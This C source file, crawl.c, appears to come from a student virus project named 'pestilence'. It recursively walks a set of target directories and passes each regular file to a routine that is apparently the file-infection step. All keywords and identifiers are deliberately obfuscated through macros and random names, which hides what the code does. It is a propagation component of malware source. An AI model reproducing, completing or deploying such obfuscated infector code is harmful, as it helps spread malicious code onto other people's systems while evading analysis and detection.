/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crawl.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/13 13:07:36 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "pestilence.h"
#include "flood.h"

#include <string.h>
#include <stdlib.h>
#include <dirent.h>

static int	crawl_dir(const char *yttrgigf, t_exec_ctx *fwefewfewfew)
{ _Sq dirent	*tyqqwxwe _ST _Nq;
DIR			*dewfw _ST _OD(yttrgigf);
_Iq(!dewfw) _Rq(_mZ);
_Dq { tyqqwxwe _ST _RD(dewfw);
_Iq(tyqqwxwe) { _Iq(_DOT(tyqqwxwe->d_name) _OR _DDOT(tyqqwxwe->d_name)) _Cq;
_cC zblor _ST _SJ(yttrgigf, "/");
_Iq(zblor _EG _Nq) _Gq _efwwqqq;
_cC trefee _ST _SJ(zblor, tyqqwxwe->d_name);
_FR(zblor);
_Iq(trefee _EG _Nq) _Gq _efwwqqq;
_Iq(tyqqwxwe->d_type _EG DT_DIR) { _Iq(_CRd(trefee,fwefewfewfew) _EG _mZ) _Gq _ewewwdqwq; }
_Eq { _Iq(_IFf(fwefewfewfew,trefee) _EG _mZ) _Gq _ewewwdqwq; }
_FR(trefee);
_Gq _cheqsdww;
_ewewwdqwq:
_FR(trefee);
_Gq _efwwqqq; }
_cheqsdww:;
} _Wq(tyqqwxwe);
_CD(dewfw);
_Rq(_pZ);
_efwwqqq:
_CD(dewfw);
_Rq(_mZ);}

int	crawl(t_exec_ctx *fwefewfewfew)
{ _Cc gteerrneo[] _ST _WKq;
const uint64_t	ewfewfewu _ST sizeof(gteerrneo)/sizeof(*gteerrneo);
_fr(_st wfwexx _ST _pZ; wfwexx < ewfewfewu; wfwexx++)
_Iq(_CRd(gteerrneo[wfwexx],fwefewfewfew) _EG _mZ) _Rq(_mZ);
_Rq(_pZ);}
